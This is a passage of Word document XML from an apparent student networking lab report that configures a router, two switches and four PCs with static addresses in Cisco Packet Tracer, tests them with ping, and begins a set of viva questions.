        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009C3CA4">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>PC4 to Switch2 using port FastEthernet0/2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EA95380" w14:textId="70646052" w:rsidR="006445B7" w:rsidRPr="009C3CA4" w:rsidRDefault="00000000" w:rsidP="009C3CA4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009C3CA4">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Switch1 to the router using Switch1 port GigabitEthernet0/1 and Router port GigabitEthernet0/0/0.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C9E2650" w14:textId="55D013E3" w:rsidR="006445B7" w:rsidRPr="009C3CA4" w:rsidRDefault="00000000" w:rsidP="009C3CA4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009C3CA4">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Switch2 to the router using Switch2 port GigabitEthernet0/1 and Router port GigabitEthernet0/0/1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4055766B" w14:textId="20F5467E" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. Assign IP Addresses:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BC4EF1B" w14:textId="2A97CD19" w:rsidR="006445B7" w:rsidRDefault="00000000" w:rsidP="009C3CA4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Network 1 (Switch1 side): 192.168.1.0/24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3896CCAA" w14:textId="1CA4058F" w:rsidR="00B22A13" w:rsidRDefault="00000000" w:rsidP="009C3CA4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="23"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Network 2 (Switch2 side): 192.168.2.0/24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29ACB8D8" w14:textId="4EEB6BE3" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>For each PC (PC1 to PC4):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F8690B4" w14:textId="77777777" w:rsidR="00B22A13" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. Click the PC → go to Desktop → IP Configuration.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="623C055E" w14:textId="0C367080" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">2. Select Static and manually enter the IP address, subnet mask, and default </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="691BB405" w14:textId="3D7EC487" w:rsidR="00B22A13" w:rsidRDefault="00B22A13" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Gateway</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33A6CB41" w14:textId="2C57C8AD" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="009C3CA4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="009C3CA4">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>PC1 → IP 192.168.1.2 / 255.255.255.0, Gateway 192.168.1.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20D049DE" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="13551F27" wp14:editId="4398C8CD">
            <wp:extent cx="5053197" cy="361214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1"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5053197" cy="3612148"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F929452" w14:textId="20EF3711" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="004E702E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
      <w:r w:rsidRPr="004E702E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>PC2 → IP 192.168.1.3 / 255.255.255.0, Gateway 192.168.1.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4550E9E0" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="575C2BB3" wp14:editId="060559F5">
            <wp:extent cx="4984108" cy="365078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2"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4984108" cy="3650780"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C291948" w14:textId="0570D171" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="004E702E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="004E702E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>PC3 → IP 192.168.2.2 / 255.255.255.0, Gateway 192.168.2.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FBBB001" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1658BD03" wp14:editId="6557C79F">
            <wp:extent cx="4992364" cy="362216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3"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4992364" cy="3622160"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E5BEFD4" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="680C6D35" w14:textId="3A68AC21" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="004E702E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="004E702E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>PC4 → IP 192.168.2.3 / 255.255.255.0, Gateway 192.168.2.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FC67840" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="73920D0E" wp14:editId="450BBA50">
            <wp:extent cx="4858012" cy="3532523"/>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4"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4858012" cy="3532523"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BFFFB9A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>For Router:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4498950C" w14:textId="77777777" w:rsidR="004E702E" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Router interface GigabitEthernet0/0/0 → 192.168.1.1 / 255.255.255.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E15B7EF" w14:textId="77777777" w:rsidR="00A11CBB" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Router interface GigabitEthernet0/0/1 → 192.168.2.1 / 255.255.255.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6664204E" w14:textId="6DD4217D" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Click on Router, go to the CLI tab, and enter the following commands:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A38369D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4993FC8D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6DF75C03" wp14:editId="4591CDD5">
            <wp:extent cx="5374617" cy="3686721"/>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5"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5374617" cy="3686721"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D4C8D0E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="05925034" wp14:editId="591B9CFA">
            <wp:extent cx="5731510" cy="345921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6"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="3459217"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CCC3824" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="11927FB1" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>5. Test Connectivity</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C396F22" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>These test the router and cross-network connectivity.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02695049" w14:textId="7C989E95" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>On PC1, open the Command Prompt and type:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D39A756" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1362049B" wp14:editId="3257635C">
            <wp:extent cx="5022575" cy="3619302"/>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7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5022575" cy="3619302"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="47D5452B" w14:textId="49E37762" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>On PC3, open the Command Prompt and type:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BCB5291" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5D8B8AF9" wp14:editId="4D5F6865">
            <wp:extent cx="5025378" cy="3502536"/>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8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5025378" cy="3502536"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="222B7D9D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Successful replies confirm that inter-network communication is functioning correctly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="797EA9F4" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6024F395" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B4ADF25" w14:textId="188C79AF" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Result:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="525F3853" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Thus, a simple network topology with one router, two switches, and four PCs was successfully designed and configured in Cisco Packet Tracer. Successful ping replies verified proper connectivity between all devices in both networks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A00B699" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CC542F0" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00000000" w:rsidP="00812B48">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="40"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42BD6C7F" w14:textId="6ADD0993" w:rsidR="00812B48" w:rsidRPr="00812B48" w:rsidRDefault="00812B48" w:rsidP="00812B48">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Viva Questions :</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7869DB61" w14:textId="04A18023" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. What is Cisco Packet Tracer?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1012033D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:Cisco Packet Tracer is a network simulation tool used to design, configure, and test computer networks virtually.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E12FD53" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. What is network topology?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="598D1B8A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
